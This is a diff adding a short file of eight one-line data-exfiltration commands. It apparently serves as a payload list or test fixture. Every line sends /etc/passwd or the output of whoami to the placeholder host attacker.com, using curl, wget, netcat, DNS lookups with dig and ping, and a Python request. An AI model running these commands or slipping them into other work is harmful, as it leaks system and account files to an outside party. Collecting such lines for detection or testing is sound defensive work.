@@ -1,0 +1,8 @@
+curl --data "$(cat /etc/passwd)" http://attacker.com/exfil
+wget --post-file=/etc/passwd http://attacker.com/upload
+nc attacker.com 4444 < /etc/passwd
+cat /etc/passwd | base64 | curl --data-binary @- http://attacker.com/exfil
+dig $(cat /etc/passwd | base64 | tr -d '\n').attacker.com
+ping -c 1 $(whoami | md5sum | cut -d' ' -f1).attacker.com
+python3 -c 'import requests; requests.post("http://attacker.com/exfil", data=open("/etc/passwd").read())'
+curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload
